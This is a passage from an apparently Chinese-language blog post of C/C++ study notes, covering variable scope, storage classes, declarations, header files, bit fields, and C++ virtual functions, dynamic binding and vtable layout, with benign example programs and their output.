class="line">        <span class="keyword">int</span> temp2 = b;  <span class="comment">//块级变量</span></span><br><span class="line">        b = a % b;</span><br><span class="line">        a = temp2;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>“temp1”的作用域是 if 内部，“temp2”的作用域是 while 内部 </p>
<p>二，for循环中定义的变量，作用作用域仅限于for循环</p>
<p>三，单独的代码块也可以成立</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">22</span>;  <span class="comment">//编号①</span></span><br><span class="line">    <span class="comment">//由&#123; &#125;包围的代码块</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">40</span>;  <span class="comment">//编号②</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;block n: %d\n&quot;</span>, n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main n: %d\n&quot;</span>, n);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里有两个 n，它们位于不同的作用域，不会产生命名冲突</p>
<p>​        // { } 的作用域比 main() 更小</p>
<p>参考： <a target="_blank" rel="noopener" href="http://c.biancheng.net/view/1860.html">C语言块级变量：在代码块内部定义的变量 </a> </p>
<p><strong>文件作用域简析</strong></p>
<p>简单来说，就是在函数外声明的作用域，其名称从声明的地方开始，到该程序的结尾都是通用的 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUMBER 5   <span class="comment">// 对象式宏</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> v[NUMBER];    <span class="comment">// 在函数外声明的变量，文件作用域，定义声明</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func1</span><span class="params">(<span class="keyword">void</span>)</span></span>;   <span class="comment">// 因为func1函数是在main函数之后创建的，因此需要函数原型声明</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">int</span> v[];   <span class="comment">// 非定义声明，可省略</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;please input the scores.&quot;</span>); </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NUMBER; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;v[%d] = &quot;</span>, i); <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the max : %d\n&quot;</span>, func1());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func1</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">int</span> v[];   ## 非定义声明，可省略</span><br><span class="line">    <span class="keyword">int</span> i, max = v[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NUMBER; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (v[i] &gt; max)</span><br><span class="line">            max = v[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从“int func1(void)”开始到文件结束，都是“func1”的文本作用域，所以要在“main”前写入“int func1(void)；”，使其在作用域中</p>
<p>​        // 函数定义的“int func1(void)”也有声明的功效，为 <strong>定义声明</strong> ，而其他的都是 <strong>引用声明</strong>     </p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/liujiaxin2018/p/14594723.html">C语言中的文件作用域、函数原型声明、定义声明和非定义声明</a></p>
<p><strong>原型作用域简析</strong></p>
<p>函数原型作用域只对于函数原型声明的形式参数有意义（其它变量声明之类都在块作用域）</p>
<p>其作用域始于“(”，结束于“)” </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">Area</span><span class="params">(<span class="keyword">double</span> radius)</span></span>; <span class="comment">// radius 就只有在括号中才有效</span></span><br><span class="line"><span class="comment">// 如果后面没有跟“ ; ”，而是跟了“ &#123;&#125; ”，那么就不是函数声明，而是函数定义了，radius在后续的代码块中也可以发挥作用</span></span><br></pre></td></tr></table></figure>
<p>函数原型： 即函数声明，给出了函数名、返回值类型、参数列表（重点是参数类型）等与该函数有关的信息</p>
<p><strong>作用域的层级关系</strong></p>
<p>每个C语言程序都包含了多个作用域，不同的作用域中可以出现同名的变量，C语言会按照<strong>从小到大</strong>的顺序，一层一层地去父级作用域中查找变量，如果在最顶层的全局作用域中还未找到这个变量，那么就会报错 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> m = <span class="number">13</span>;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">20</span>;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">822</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;block1 n: %d\n&quot;</span>, n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;func1 n: %d\n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func2</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i % <span class="number">5</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;if m: %d\n&quot;</span>, m);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">int</span> n = i % <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">if</span>(n&lt;<span class="number">2</span> &amp;&amp; n&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;else m: %d\n&quot;</span>, m);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;func2 n: %d\n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func3</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;func3 n: %d\n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">30</span>;</span><br><span class="line">    func1();</span><br><span class="line">    func2(n);</span><br><span class="line">    func3();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main n: %d\n&quot;</span>, n);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="/2022/06/03/C&Cpp%E6%9D%82%E8%B0%88/1645103488630-1645590344944-1654239107513.png" class width="1645103488630"> 
<h2 id="C语言-存储类说明符"><a href="#C语言-存储类说明符" class="headerlink" title="C语言-存储类说明符"></a>C语言-存储类说明符</h2><p>C语言的存储类说明符有以下几个：</p>
<ul>
<li>Auto：只在 <strong>块内</strong> 变量声明中被允许, 表示变量具有本地生存期</li>
<li>Extern：出现在 <strong>顶层</strong> 或 <strong>块的外部</strong> 的变量函数与变量声明中，表示声明的对象具有静态生存期, 连接程序知道其名字</li>
<li>Static：可以放在 <strong>函数与变量声明中</strong> ，在函数定义时，只用于指定函数名，而不将函数导出到链接程序，在函数声明中，表示其后边会有定义声明的函数，存储类型static，在数据声明中，总是表示定义的声明不导出到连接程序 </li>
</ul>
<p>C99中规定：所有顶层的默认存储类标志符都是extern</p>
<p>在C语言中一个人为的规范：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在.h文件中声明的函数，如果在其对应的.c文件中有定义，那么我们在声明这个函数时，不使用<span class="keyword">extern</span>修饰符，反之，则必须显示使用<span class="keyword">extern</span>修饰符</span><br></pre></td></tr></table></figure>
<h2 id="C语言-定义声明-amp-引用声明"><a href="#C语言-定义声明-amp-引用声明" class="headerlink" title="C语言-定义声明&amp;引用声明"></a>C语言-定义声明&amp;引用声明</h2><p>定义声明：在声明后，立即进行定义或初始化（如：“ fun( int a ){ } ”，“ int a = 1 ”）</p>
<p>引用声明：其他的声明都是引用声明</p>
<p>​        // 这个只是“初始化语句模型”中的定义方式（为了方便理解）</p>
<p>为了区分定义声明和引用声明，C语言定义了几种模型：</p>
<ul>
<li>初始化语句模型：顶层声明中，如果存在初始化语句，表示这个声明是定义声明，其他声明是引用声明</li>
<li>省略存储类型模型：所有引用声明要显示的包括存储类extern，而唯一的那个定义声明中，省略存储类说明符</li>
</ul>
<p>在声明定义时，定义数组如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> G_glob[<span class="number">100</span>];</span><br></pre></td></tr></table></figure>
<p>在另一个文件中引用声明如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> * G_glob;</span><br></pre></td></tr></table></figure>
<h2 id="C语言-“-h”-文件的作用"><a href="#C语言-“-h”-文件的作用" class="headerlink" title="C语言 -“.h” 文件的作用"></a>C语言 -“.h” 文件的作用</h2><p>在一个C语言程序中有千千万万个函数（例如：“printf”，“read”……），为了它们的正常使用（文件作用域可以包含其“作用点”），需要事先写明函数声明</p>
<p>这些函数声明并没有写入“.c”文件中，而是写入了“.h”文件中</p>
<p>另外，全局变量也可以写在“.h”文件中，不同的“.h”文件可以写入相同名称的全局变量</p>
<p>参考： <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/3c7edc778792">C语言中的.h文件的作用</a> </p>
<h2 id="C语言-位域"><a href="#C语言-位域" class="headerlink" title="C语言-位域"></a>C语言-位域</h2><p>有些信息在存储时，并不需要占用一个完整的字节，而只需占几个或一个二进制位</p>
<p>所谓 <strong>“位域”</strong> 是把一个字节中的二进位划分为几个不同的区域，并说明每个区域的位数 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bs</span> </span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">    <span class="keyword">int</span> a:<span class="number">8</span>; </span><br><span class="line">    <span class="keyword">int</span> b:<span class="number">2</span>; </span><br><span class="line">    <span class="keyword">int</span> c:<span class="number">6</span>; </span><br><span class="line">    <span class="comment">// 位域名:位域长度</span></span><br><span class="line">&#125;data; </span><br></pre></td></tr></table></figure>
<p>说明data为bs变量，a占8位，b占2位，c占6位，共占两个字节（这里假定int类型长度为16位，2字节，通常int都是32位，4字节）</p>
<p>1.一个位域必须存储在同一个单元中，不能跨两个单元，如一个单元所剩空间不够存放另一位域时，应从下一单元起存放该位域</p>
<p>2.可以人为控制“启用&amp;关闭”位域</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">as</span> </span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">    <span class="keyword">unsigned</span> a:<span class="number">4</span> </span><br><span class="line">    <span class="keyword">unsigned</span> :<span class="number">0</span>  </span><br><span class="line">    <span class="keyword">unsigned</span> b:<span class="number">4</span>  </span><br><span class="line">    <span class="keyword">unsigned</span> c:<span class="number">4</span> </span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// a占第一字节的4位，后4位填0表示不使用</span></span><br></pre></td></tr></table></figure>
<p>3.位域可以无位域名，这时它只用来作填充或调整位置 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bs</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">    <span class="keyword">int</span> a:<span class="number">1</span> </span><br><span class="line">    <span class="keyword">int</span> :<span class="number">2</span>  </span><br><span class="line">    <span class="keyword">int</span> b:<span class="number">3</span> </span><br><span class="line">    <span class="keyword">int</span> c:<span class="number">2</span> </span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>
<h2 id="Cpp-多态-amp-虚函数"><a href="#Cpp-多态-amp-虚函数" class="headerlink" title="Cpp-多态&amp;虚函数"></a>Cpp-多态&amp;虚函数</h2><p>虚函数对于多态具有决定性的作用，有虚函数才能构成多态 </p>
<p>先看一下案例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shape</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="keyword">int</span> width,height;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Shape</span>(<span class="keyword">int</span> a=<span class="number">0</span>,<span class="keyword">int</span> b=<span class="number">0</span>)&#123;</span><br><span class="line">        width = a;</span><br><span class="line">        height = b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">area</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Shape class area: &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Shape\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bar fun width:%d\n&quot;</span>,width);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span>:</span><span class="keyword">public</span> Shape</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Rectangle</span>(<span class="keyword">int</span> a=<span class="number">0</span>,<span class="keyword">int</span> b=<span class="number">0</span>):<span class="built_in">Shape</span>(a,b)&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">area</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Rectangle class area: &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,width*height);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sayHello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Rectangle\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">fun1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fun1\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Triangle</span>:</span><span class="keyword">public</span> Shape</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Triangle</span>(<span class="keyword">int</span> a=<span class="number">0</span>,<span class="keyword">int</span> b=<span class="number">0</span>):<span class="built_in">Shape</span>(a,b)&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">area</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Triangle class area: &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,width*height/<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//void sayHello()&#123;</span></span><br><span class="line">    <span class="comment">//    printf(&quot;Triangle\n&quot;);</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">fun2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fun2\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(Shape* shape)</span></span>&#123;</span><br><span class="line">    shape-&gt;<span class="built_in">bar</span>();</span><br><span class="line">    shape-&gt;<span class="built_in">area</span>();</span><br><span class="line">    shape-&gt;<span class="built_in">sayHello</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Shape* shape = <span class="keyword">new</span> <span class="built_in">Rectangle</span>(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">test</span>(shape);</span><br><span class="line">    <span class="keyword">delete</span> shape;</span><br><span class="line"></span><br><span class="line">    shape = <span class="keyword">new</span> <span class="built_in">Triangle</span>(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">test</span>(shape);</span><br><span class="line">    <span class="keyword">delete</span> shape;</span><br><span class="line"></span><br><span class="line">    shape = <span class="keyword">new</span> <span class="built_in">Shape</span>(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">test</span>(shape);</span><br><span class="line">    <span class="keyword">delete</span> shape;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>定义了一个 Shape 类，Rectangle 类和 Triangle 类都继承 Shape 类</li>
<li>在 Shape 类中：area 和 sayHello 都是虚函数（用 virtual 进行修饰）</li>
</ul>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> g++ test.cpp -o test -g -no-pie</span><br><span class="line">➜  <span class="built_in">exp</span> ./test                         </span><br><span class="line">bar fun width:<span class="number">3</span></span><br><span class="line">Rectangle <span class="class"><span class="keyword">class</span> <span class="title">area</span>:</span> <span class="number">12</span></span><br><span class="line">Rectangle</span><br><span class="line">bar fun width:<span class="number">3</span></span><br><span class="line">Triangle <span class="class"><span class="keyword">class</span> <span class="title">area</span>:</span> <span class="number">6</span></span><br><span class="line">Shape <span class="comment">/* Triangle中没有覆写sayHello,所以还是执行父类的sayHello */</span></span><br><span class="line">bar fun width:<span class="number">3</span></span><br><span class="line">Shape <span class="class"><span class="keyword">class</span> <span class="title">area</span>:</span> <span class="number">0</span></span><br><span class="line">Shape </span><br></pre></td></tr></table></figure>
<ul>
<li>虚函数可以被子类覆写（名称&amp;格式必须相同），调用时优先调用自己的虚函数</li>
</ul>
<p>这就是多态，使用虚函数使子类可以覆写父类，提高了函数的灵活性</p>
<h2 id="Cpp-动态绑定"><a href="#Cpp-动态绑定" class="headerlink" title="Cpp-动态绑定"></a>Cpp-动态绑定</h2><p>一般情况下，在编译期间（包括链接期间）就能完成符号决议（为符号绑定相应的地址），不用等到程序执行时再进行额外的操作，这称为静态绑定，如果编译期间不能完成符号决议，就必须在程序执行期间完成，这称为动态绑定</p>
<ul>
<li>非虚成员函数属于静态绑定：编译器在编译期间，根据指针（或对象）的类型完成了绑定 </li>
<li>调用虚函数时，就会发生动态绑定，所谓动态绑定，就是在运行时，虚函数会 <strong>根据绑定对象的实际类型，选择调用函数的版本</strong>（因为 cpp 的多态机制，我们无法在编辑阶段完成符号决议，因为不清楚该虚函数是A类，B类，还是C类）<ul>
<li>例如：我们不清楚符号 area 会绑定 Shape 中的代码地址，还是 Triangle 中的代码地址，或者是 Rectangle 中的代码地址</li>
</ul>
</li>
</ul>
<p>如果一个类包含了虚函数，那么在创建对象时会额外增加一张表，表中的每一项都是虚函数的入口地址，这张表就是虚函数表，也称为 vtable</p>
<p>可以认为虚函数表是一个数组，为了把对象和虚函数表关联起来，编译器会在对象中安插一个指针，指向虚函数表的起始位置，这个指针就是 VPTR 指针（在以后的 pwn 中会遇到）</p>
<h2 id="Cpp-虚表"><a href="#Cpp-虚表" class="headerlink" title="Cpp-虚表"></a>Cpp-虚表</h2><p>为了实现 C++ 的多态，C++ 使用了一种动态绑定的技术，这个技术的核心是虚函数表</p>
<ul>
<li>每个包含了虚函数的类都包含一个虚表</li>
</ul>
<p>我们知道，当一个类（A）继承另一个类（B）时，类A会继承类B的函数的调用权，所以如果一个基类包含了虚函数，那么其继承类也可调用这些虚函数，换句话说，一个类继承了包含虚函数的基类，那么这个类也拥有自己的虚表</p>
<p>我们来看以下的代码：（紧接上面的例子）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ShapeP :%ld\n&quot;</span>,<span class="keyword">sizeof</span>(ShapeP)); <span class="comment">/* ShapeP就是去掉虚函数的Shape */</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Shape :%ld\n&quot;</span>,<span class="keyword">sizeof</span>(Shape));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Rectangle: %ld\n&quot;</span>,<span class="keyword">sizeof</span>(Rectangle));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Triangle: %ld\n&quot;</span>,<span class="keyword">sizeof</span>(Triangle));</span><br></pre></td></tr></table></figure>
<ul>
<li>Shape，Rectangle，Triangle，都应该有虚表</li>
<li>ShapeP 应该没有虚表</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ShapeP :<span class="number">8</span></span><br><span class="line">Shape :<span class="number">16</span></span><br><span class="line">Rectangle: <span class="number">16</span></span><br><span class="line">Triangle: <span class="number">16</span></span><br></pre></td></tr></table></figure>
<ul>
<li>很明显，编译器多分配了8字节，用于存储虚表头指针</li>
</ul>
<p>内存布局如下：</p>
<ul>
<li>Shape：定义了虚函数 area，sayHello</li>
</ul>
<img src="/2022/06/03/C&Cpp%E6%9D%82%E8%B0%88/1654235784704-1654239107513.png" class width="1654235784704"> 
<ul>
<li>Rectangle：覆写了虚函数 area，sayHello，定义了虚函数 fun1</li>
</ul>
<img src="/2022/06/03/C&Cpp%E6%9D%82%E8%B0%88/1654235831258-1654239107513.png" class width="1654235831258"> 
<ul>
<li>Triangle：覆写了虚函数 area，继承了虚函数 sayHello，定义了虚函数 fun2</li>
</ul>
<img src="/2022/06/03/C&Cpp%E6%9D%82%E8%B0%88/1654235878937-1654239107513.png" class width="1654235878937"> 
<p>我们可以用另一种方式进行验证：</p>
